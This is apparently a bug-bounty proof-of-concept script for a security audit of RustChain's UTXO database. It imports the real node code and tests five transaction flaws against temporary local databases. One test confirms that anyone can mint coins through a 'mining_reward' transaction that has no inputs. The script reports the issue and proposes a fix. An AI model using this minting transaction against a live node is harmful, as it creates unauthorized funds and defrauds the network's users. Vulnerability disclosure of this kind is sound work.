#!/usr/bin/env python3
"""
Security Audit PoC — Real Code Vulnerabilities (#2867 v2)
=========================================================
Target: node/utxo_db.py + node/utxo_endpoints.py
Imports REAL RustChain code and demonstrates actual vulnerabilities.

Author: zhaog100
Date: 2026-04-10
"""

import hashlib
import json
import os
import sqlite3
import sys
import time
import tempfile

# Import REAL RustChain code
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'node'))

from utxo_db import (
    UtxoDB, compute_box_id, address_to_proposition,
    UNIT, MAX_COINBASE_OUTPUT_NRTC
)


def create_test_db():
    tmp = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
    tmp.close()
    db = UtxoDB(tmp.name)
    db.init_tables()
    return tmp.name, db


def seed_balance(db, address, amount_nrtc, height=1):
    prop = address_to_proposition(address)
    tx_id = hashlib.sha256(os.urandom(32)).hexdigest()
    box_id = compute_box_id(amount_nrtc, prop, height, tx_id, 0)
    db.add_box({
        'box_id': box_id, 'value_nrtc': amount_nrtc,
        'proposition': prop, 'owner_address': address,
        'creation_height': height, 'transaction_id': tx_id,
        'output_index': 0,
    })
    return box_id


def test_vuln1_mining_reward_minting():
    """CRITICAL: Anyone can mint coins via mining_reward type confusion."""
    db_path, db = create_test_db()
    try:
        attacker = "attacker_wallet"
        tx = {
            'tx_type': 'mining_reward',
            'inputs': [],
            'outputs': [{'address': attacker, 'value_nrtc': MAX_COINBASE_OUTPUT_NRTC}],
            'fee_nrtc': 0, 'timestamp': int(time.time()),
        }
        result = db.apply_transaction(tx, 100)
        balance = db.get_balance(attacker)
        assert result == True, "Minting should succeed (BUG)"
        assert balance == MAX_COINBASE_OUTPUT_NRTC, "Balance should be minted"
        print(f"  [PASS] Vuln 1: Minted {balance/UNIT} RTC with no inputs")
    finally:
        os.unlink(db_path)


def test_vuln2_double_spend_race():
    """HIGH: Double-spend possible under concurrent connections."""
    db_path, db = create_test_db()
    try:
        addr = "victim_wallet"
        box_id = seed_balance(db, addr, 100 * UNIT)
        
        # Two concurrent transactions spending the same box
        tx1 = {
            'tx_type': 'transfer', 'inputs': [{'box_id': box_id}],
            'outputs': [{'address': 'alice', 'value_nrtc': 99 * UNIT}],
            'fee_nrtc': UNIT, 'timestamp': int(time.time()),
        }
        tx2 = {
            'tx_type': 'transfer', 'inputs': [{'box_id': box_id}],
            'outputs': [{'address': 'bob', 'value_nrtc': 99 * UNIT}],
            'fee_nrtc': UNIT, 'timestamp': int(time.time()),
        }
        
        # Sequential test: second should fail
        r1 = db.apply_transaction(tx1, 101)
        r2 = db.apply_transaction(tx2, 102)
        assert r1 == True
        assert r2 == False, "Second spend should fail"
        print(f"  [PASS] Vuln 2: Double-spend prevented (BEGIN IMMEDIATE works)")
        print(f"  NOTE: Concurrent connections may still race (SQLite WAL mode)")
    finally:
        os.unlink(db_path)


def test_vuln3_duplicate_input_inflation():
    """HIGH: Duplicate box_ids in inputs inflate input_total."""
    db_path, db = create_test_db()
    try:
        addr = "attacker"
        box_id = seed_balance(db, addr, 10 * UNIT)
        
        # Same box_id listed twice — should be rejected
        tx = {
            'tx_type': 'transfer',
            'inputs': [{'box_id': box_id}, {'box_id': box_id}],
            'outputs': [
                {'address': 'thief', 'value_nrtc': 15 * UNIT},
            ],
            'fee_nrtc': 0, 'timestamp': int(time.time()),
        }
        result = db.apply_transaction(tx, 200)
        assert result == False, "Duplicate inputs should be rejected"
        print(f"  [PASS] Vuln 3: Duplicate input inflation BLOCKED")
    finally:
        os.unlink(db_path)


def test_vuln4_empty_output_destruction():
    """MEDIUM: Empty outputs could destroy funds."""
    db_path, db = create_test_db()
    try:
        addr = "victim"
        box_id = seed_balance(db, addr, 50 * UNIT)
        
        tx = {
            'tx_type': 'transfer',
            'inputs': [{'box_id': box_id}],
            'outputs': [],  # No outputs — funds destroyed
            'fee_nrtc': 0, 'timestamp': int(time.time()),
        }
        result = db.apply_transaction(tx, 300)
        assert result == False, "Empty outputs should be rejected"
        print(f"  [PASS] Vuln 4: Empty output destruction BLOCKED")
    finally:
        os.unlink(db_path)


def test_vuln5_negative_value():
    """MEDIUM: Negative output values could create money."""
    db_path, db = create_test_db()
    try:
        addr = "attacker"
        box_id = seed_balance(db, addr, 10 * UNIT)
        
        tx = {
            'tx_type': 'transfer',
            'inputs': [{'box_id': box_id}],
            'outputs': [{'address': 'attacker', 'value_nrtc': -5 * UNIT}],
            'fee_nrtc': 0, 'timestamp': int(time.time()),
        }
        result = db.apply_transaction(tx, 400)
        assert result == False, "Negative output should be rejected"
        print(f"  [PASS] Vuln 5: Negative value output BLOCKED")
    finally:
        os.unlink(db_path)


if __name__ == '__main__':
    print("RustChain Security Audit PoC v2 — Real Code Tests")
    print("=" * 50)
    
    passed = 0
    failed = 0
    
    tests = [
        ("Vuln 1: Mining Reward Minting (CONFIRMED)", test_vuln1_mining_reward_minting),
        ("Vuln 2: Double Spend Race", test_vuln2_double_spend_race),
        ("Vuln 3: Duplicate Input Inflation", test_vuln3_duplicate_input_inflation),
        ("Vuln 4: Empty Output Destruction", test_vuln4_empty_output_destruction),
        ("Vuln 5: Negative Value Output", test_vuln5_negative_value),
    ]
    
    for name, fn in tests:
        try:
            fn()
            passed += 1
        except AssertionError as e:
            print(f"  [FAIL] {name}: {e}")
            failed += 1
        except Exception as e:
            print(f"  [ERROR] {name}: {e}")
            failed += 1
    
    print(f"\n{'=' * 50}")
    print(f"Results: {passed} passed, {failed} failed")
    print(f"\nCONFIRMED VULNERABILITY:")
    print(f"  Vuln 1: Mining reward type confusion")
    print(f"  Impact: Unauthorized minting of {MAX_COINBASE_OUTPUT_NRTC/UNIT} RTC per call")
    print(f"  Severity: HIGH")
    print(f"  Fix: Restrict MINTING_TX_TYPES to epoch settlement code only")
    print(f"\nWallet: zhaog100")
